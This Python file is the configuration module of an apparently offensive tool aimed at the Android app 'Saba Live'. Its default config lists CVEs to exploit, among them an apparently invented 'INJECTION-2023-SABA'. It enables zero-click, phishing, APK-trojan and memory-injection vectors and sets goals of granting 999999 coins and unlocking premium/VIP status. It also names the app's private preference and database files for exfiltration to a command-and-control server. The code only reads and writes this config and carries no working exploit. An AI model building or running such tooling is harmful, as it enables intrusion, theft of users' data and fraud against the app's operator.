#!/usr/bin/env python3
# Target Configuration Module

import json
import os

class TargetConfig:
    def __init__(self):
        self.config_file = "config/targets.json"
        self.default_config = {
            "primary_target": {
                "app_name": "Saba Live",
                "package": "com.saba.live",
                "version": "5.2.1",
                "vulnerabilities": [
                    "CVE-2021-30551",
                    "CVE-2022-3970",
                    "INJECTION-2023-SABA"
                ]
            },
            "attack_vectors": {
                "zero_click": True,
                "phishing": True,
                "apk_trojan": True,
                "memory_injection": True
            },
            "monetization": {
                "coin_target": 999999,
                "premium_unlock": True,
                "vip_upgrade": True
            },
            "exfiltration": {
                "target_files": [
                    "/data/data/com.saba.live/shared_prefs/*.xml",
                    "/data/data/com.saba.live/databases/*.db"
                ],
                "encryption": "AES-256-GCM",
                "c2_protocol": "HTTPS"
            }
        }
        
    def load_or_create(self):
        """تحميل أو إنشاء الإعدادات"""
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            self.save_config(self.default_config)
            return self.default_config
            
    def save_config(self, config):
        """حفظ الإعدادات"""
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)
            
    def update_target(self, key, value):
        """تحديث هدف معين"""
        config = self.load_or_create()
        
        # تحديث عميق للمفتاح
        keys = key.split('.')
        current = config
        for k in keys[:-1]:
            current = current.setdefault(k, {})
        current[keys[-1]] = value
        
        self.save_config(config)
        return True
